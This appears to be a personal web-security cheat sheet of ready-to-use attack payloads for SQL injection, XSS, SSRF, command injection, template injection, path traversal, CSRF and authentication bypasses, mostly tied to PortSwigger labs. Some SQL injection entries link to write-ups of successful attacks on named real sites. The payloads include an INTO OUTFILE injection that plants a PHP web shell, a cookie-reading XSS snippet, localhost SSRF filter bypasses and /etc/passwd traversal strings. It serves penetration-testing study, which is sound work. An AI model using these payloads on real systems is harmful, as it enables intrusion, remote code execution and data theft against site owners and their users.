---
title: Cheat Sheet
description: Cheat Sheet
last_update:
  date: "2025-11-10T08:00:00+08:00"
---

## SQL Injection

### Cheat Sheet

https://portswigger.net/web-security/sql-injection/cheat-sheet

### Recon

- `'`
- `' OR 1=1#`
- `' OR '1'='1`

### UNION Based

- `' UNION SELECT NULL#`
- `' UNION SELECT NULL FROM dual--`
- `' UNION SELECT 1, 'string'#`
  - [Real World Example 1](https://zeroday.hitcon.org/vulnerability/ZD-2025-00972)
- `' UNION SELECT '<?php $host = "localhost"; system($_GET["cmd"]); ?>' INTO OUTFILE 'D:/xampp/htdocs/shell.php'`
  - [Real World Example 1](../web-security/sql-injection-dce-success)

### Stacked Queries

- `';SELECT 1/name FROM sysobjects WHERE xtype LIKE 'U' AND name BETWEEN 'A' AND 'AZ'`
  - [Real World Example 1](../web-security/sql-injection-stationer-success)

### Error Based

- `'`
- `' OR CAST((SELECT username FROM users LIMIT 1) AS boolean)--`
- `ExtractValue` and `CONCAT`
  - [Real World Example 1](../web-security/sql-injection-beta-gocare-success.md)
  - [Real World Example 2](../web-security/sql-injection-topone-print-success.md)
    <!-- - [Real World Example 3](../web-security/sql-injection-ls-design-success.md) -->
    <!-- - [Real World Example 4](../web-security/sql-injection-fulifa-success) -->
  - [Real World Example 3](../web-security/sql-injection-artgarden-success)
- `UpdateXML` and `CONCAT`
  - [Real World Example 1](https://zeroday.hitcon.org/vulnerability/ZD-2025-01032)
- `' AND 1 = CONVERT(int,@@version)--123`
  - [Real World Example 1](../web-security/sql-injection-wowisee-success)
  - [Real World Example 2](../web-security/sql-injection-wowcard-success)
- `' AND 1 = CONVERT(int,(SELECT table_name FROM information_schema.tables FOR XML PATH('')))--`
  - [Real World Example 1](../web-security/sql-injection-spirit-tku-success)
- `';SELECT 1/name FROM sysobjects WHERE xtype LIKE 'U' AND name BETWEEN 'A' AND 'AZ'`
  - [Real World Example 1](../web-security/sql-injection-stationer-success)

### Boolean Based

- `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20) = 'a`

### Blind

- [time delays](https://portswigger.net/web-security/sql-injection/cheat-sheet#time-delays)
- [DNS Lookup](https://portswigger.net/web-security/sql-injection/cheat-sheet#dns-lookup)

### Bypass Skill

- white space not allowed => `/**/`, `%20`, `+`
- [`(`, `)`, `=`, `>`, `<`, `.` not allowed](./sql-injection-stationer-success.md)

## XSS

### Payloads

- `<script>alert(1)`
- `<script>alert(1)</script>`
- `<SCRIpt>alert(1)</scriPT>`
- `"/><script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `javascript:alert(1)`
- `123" autofocus onfocus="alert(0)" data-type="456`
- `<di onfocus="alert(document.cookie)" tabindex="0" autofocus></di>`
- `';alert(1);var a = '3`
- `<svg><animateTransform onbegin="alert(1)" attributeName="transform" dur="0.1s" /></svg>`
- `'accesskey='x'onclick='alert(1)`
- `<svg><a><animate attributeName="href" values="javascript:alert(1)" /><text x=20 y=20>Click me</text></a></svg>`
- [`(`, `)`, `{`, `}` and `;` are blocked](../port-swigger/cross-site-scripting.md#lab-reflected-xss-in-a-javascript-url-with-some-characters-blocked)

### AngularJS

- `{{ constructor.constructor('alert("XSS")')() }}`
- [AngularJS 1](../port-swigger/cross-site-scripting.md#lab-reflected-xss-with-angularjs-sandbox-escape-without-strings)
- [AngularJS 2](../port-swigger/cross-site-scripting.md#lab-reflected-xss-with-angularjs-sandbox-escape-and-csp)

## CSRF

### Prerequisite

- Simple Request (HTML `<form>`, `<img>`, `<iframe>` 可發出的請求)

### Recon

- CSRF Token Bypass
  - [GET Method Bypass CSRF Token](../port-swigger/cross-site-requesy-forgery.md#lab-csrf-where-token-validation-depends-on-request-method)
  - [Strip `csrf: string`](../port-swigger/cross-site-requesy-forgery.md#lab-csrf-where-token-validation-depends-on-token-being-present)
  - [CSRF token is not tied to user session](../port-swigger/cross-site-requesy-forgery.md#lab-csrf-where-token-is-not-tied-to-user-session)
- CSRF Token + CRLF Injection Bypass
  - [Control Set-Cookie via CSRF Injection](../port-swigger/cross-site-requesy-forgery.md#lab-csrf-where-token-is-tied-to-non-session-cookie)
  - [Double Submit](../port-swigger/cross-site-requesy-forgery.md#lab-csrf-where-token-is-duplicated-in-cookie)
- SameSite Bypass
  - [SameSite Lax bypass via method override](../port-swigger/cross-site-requesy-forgery.md#lab-samesite-lax-bypass-via-method-override)
  - [SameSite Strict bypass via client-side redirect](../port-swigger/cross-site-requesy-forgery.md#lab-samesite-strict-bypass-via-client-side-redirect)
  - [SameSite Strict bypass via 30x redirect](../port-swigger/cross-site-requesy-forgery.md#lab-samesite-strict-bypass-via-client-side-redirect)
  - [SameSite Strict bypass via sibling domain Reflected XSS](../port-swigger/cross-site-requesy-forgery.md#lab-samesite-strict-bypass-via-sibling-domain)
  - [SameSite Lax bypass via 2 mins cookie](../port-swigger/cross-site-requesy-forgery.md#lab-samesite-lax-bypass-via-cookie-refresh)
- Referer Bypass
  - [Strip Referer Header using `<meta name="referrer" content="never" />`](../port-swigger/cross-site-requesy-forgery.md#lab-csrf-where-referer-validation-depends-on-header-being-present)
  - [Broken Referer validation using `referer.contains('vulnerable-website.com')`](../port-swigger/cross-site-requesy-forgery.md#lab-csrf-with-broken-referer-validation)

<!-- ### Clickjacking -->

## DOM-based vulnerabilities

### Recon

- [DOM clobbering via `window.vulnerableKey`](../port-swigger/dom-based-vulnerabilities.md#lab-exploiting-dom-clobbering-to-enable-xss)
- [Clobbering DOM attributes](../port-swigger/dom-based-vulnerabilities.md#lab-clobbering-dom-attributes-to-bypass-html-filters)

## CORS

### Recon

- [Origin Reflection](../port-swigger/cors.md#lab-cors-vulnerability-with-basic-origin-reflection)
- [null Origin Bypass](../port-swigger/cors.md#lab-cors-vulnerability-with-trusted-null-origin)

## XXE

### Recon

- [XXE leads to LFI](../port-swigger/xxe.md#lab-exploiting-xinclude-to-retrieve-files)
- [XXE leads to SSRF](../port-swigger/xxe.md#lab-exploiting-xxe-to-perform-ssrf-attacks)
- [XInclude leads to LFI](../port-swigger/xxe.md#lab-exploiting-xinclude-to-retrieve-files)
- [XXE via SVG Image Upload](../port-swigger/xxe.md#lab-exploiting-xxe-via-image-file-upload)
- [Blind XXE via External DTD](../port-swigger/xxe.md#lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd)
- [XXE via Error Msg](../port-swigger/xxe.md#lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages)

## SSRF

### Recon

- [SSRF to localhost](../port-swigger/ssrf.md#lab-basic-ssrf-against-the-local-server)
- [Bypass 黑名單](../port-swigger/ssrf.md#lab-ssrf-with-blacklist-based-input-filter)
  - Decimal: `http://2130706433`
  - Octal: `http://017700000001`
  - Short form: `http://127.1`
  - Full URL encoding:`http://%31%32%37%2e%30%2e%30%2e%31`
  - Hex: `http://0x7f.0.0.1`
  - Partial URL encoding: `http://%3127.0.0.1`
- [Bypass 白名單](../port-swigger/ssrf.md#lab-ssrf-with-whitelist-based-input-filter)
  - URL Encode Fragment: `http://localhost%23@vulnerable-website.com`
  - Double URL Encode With username:password: `http://localhost:80%2523@vulnerable-website.com`
- [SSRF via Open Redirect](../port-swigger/ssrf.md#lab-ssrf-with-filter-bypass-via-open-redirection-vulnerability)

### Tool: URL Encode All Characters

```ts
function encodeSingleStringToURIComponent(str) {
  return "%" + str.charCodeAt(0).toString(16);
}
```

## OS command injection

### Useful commands

https://portswigger.net/web-security/os-command-injection#useful-commands

### Recon

- `1 & echo whoami &`
- `& ping -c 10 127.0.0.1 &`
- `& whoami > /var/www/images/whoami.txt &`
- [Ways of injecting OS commands](https://portswigger.net/web-security/os-command-injection#ways-of-injecting-os-commands)

## Server-side template injection

### Recon

- `${{<%[%'"}}%\`
- [Ruby ERB](../port-swigger/server-side-template-injection.md#lab-basic-server-side-template-injection)
- [Python tornado](../port-swigger/server-side-template-injection.md#lab-basic-server-side-template-injection-code-context)
- [Apache FreeMarker](../port-swigger/server-side-template-injection.md#lab-server-side-template-injection-using-documentation)
- [Handlebars.js](../port-swigger/server-side-template-injection.md#lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
- [Python Django](../port-swigger/server-side-template-injection.md#lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)
- [Apache FreeMarker (EXPERT)](../port-swigger/server-side-template-injection.md#lab-server-side-template-injection-in-a-sandboxed-environment)
- [PHP Twig (EXPERT)](../port-swigger/server-side-template-injection.md#lab-server-side-template-injection-with-a-custom-exploit)

## Path traversal

### Payloads

- [Basic](../port-swigger/path-traversal.md#lab-file-path-traversal-simple-case): `../../../etc/passwd`
- [Strip non-recursively](../port-swigger/path-traversal.md#lab-file-path-traversal-traversal-sequences-stripped-non-recursively)
- [URL Encode](../port-swigger/path-traversal.md#lab-file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode)
  - Partial URL Encode: `..%2F..%2F..%2Fetc%2Fpasswd`
  - URL Encode: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
  - Double URL Encode: `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`
- [Start Path](../port-swigger/path-traversal.md#lab-file-path-traversal-validation-of-start-of-path): `/var/www/images/../../../etc/passwd`
- [Null Byte](../port-swigger/path-traversal.md#lab-file-path-traversal-validation-of-file-extension-with-null-byte-bypass): `../../../etc/passwd%00.jpg`
- `/etc/./passwd`
- `/etc/../etc/passwd`
- `/etc/../ETC/passwd`
- Windows: `non-exist-dir/../../../file.txt`

## Access control

### Recon

- [`/robots.txt`](../port-swigger/access-control.md#lab-unprotected-admin-functionality)
- [Reuqest Param](../port-swigger/access-control.md#lab-user-role-controlled-by-request-parameter)
  - `Cookie: admin=true`
  - `?role=1`
  - `roleid=2`
- [Request Header](../port-swigger/access-control.md#lab-url-based-access-control-can-be-circumvented)
  - `X-Original-URL`
  - [403 Bypasser](<(https://github.com/sting8k/BurpSuite_403Bypasser)>)
- [Casing, File Extension, Trailing Slash](../port-swigger/access-control.md#lab-user-id-controlled-by-request-parameter)
- [30x With Sensitive Data](../port-swigger/access-control.md#lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect)
- [IDOR](../port-swigger/access-control.md#lab-user-id-controlled-by-request-parameter-with-password-disclosure)
  - `?id=administrator`
  - `?userId=1`
- [Referer Based](../port-swigger/access-control.md#lab-referer-based-access-control)

## Authentication

### Recon

- Username/Password enumeration
  - [via different responses](../port-swigger/authentication.md#lab-username-enumeration-via-different-responses)
  - [via subtly different responses](../port-swigger/authentication.md#lab-username-enumeration-via-subtly-different-responses)
  - [via response timing](../port-swigger/authentication.md#lab-username-enumeration-via-response-timing)
  - `X-Forwarded-For`
  - [Success Login can reset counter](../port-swigger/authentication.md#lab-broken-brute-force-protection-ip-block)
  - [via account lock](../port-swigger/authentication.md#lab-username-enumeration-via-account-lock)
  - [multiple credentials per request](../port-swigger/authentication.md#lab-broken-brute-force-protection-multiple-credentials-per-request)
  - [via stay-logged-in cookie](../port-swigger/authentication.md#lab-brute-forcing-a-stay-logged-in-cookie)
  - [via password change](../port-swigger/authentication.md#lab-password-brute-force-via-password-change)
- [Brute-Force verification code](../port-swigger/authentication.md#lab-2fa-broken-logic)
- [Password reset using victim's username](../port-swigger/authentication.md#lab-password-reset-broken-logic)
- [Password reset poison via `X-Forward-Host`](../port-swigger/authentication.md#lab-password-reset-poisoning-via-middleware)

<!--
"port-swigger/oauth",
"port-swigger/websocket",
"port-swigger/web-cache-poisoning",
"port-swigger/insecure-deserialization",
"port-swigger/information-disclosure",
"port-swigger/http-host-header-attacks",
"port-swigger/prototype-pollution",
"port-swigger/essential-skills",
"port-swigger/business-logic-vulnerabilities",
"port-swigger/api-testing",
"port-swigger/llm-attacks",
"port-swigger/nosql-injection",
"port-swigger/web-cache-deception",
"port-swigger/file-upload-vulnerabilities",
"port-swigger/jwt",
"port-swigger/graphql",
"port-swigger/race-conditions",
"port-swigger/http-request-smuggling", -->

<!-- ## Essential skills

### Obfuscation
- URL encoding
- double URL encoding
- HTML encoding
- XML encoding
- unicode escaping
- hex escaping
- octal escaping
- multiple encodings
- SQL CHAR() function -->
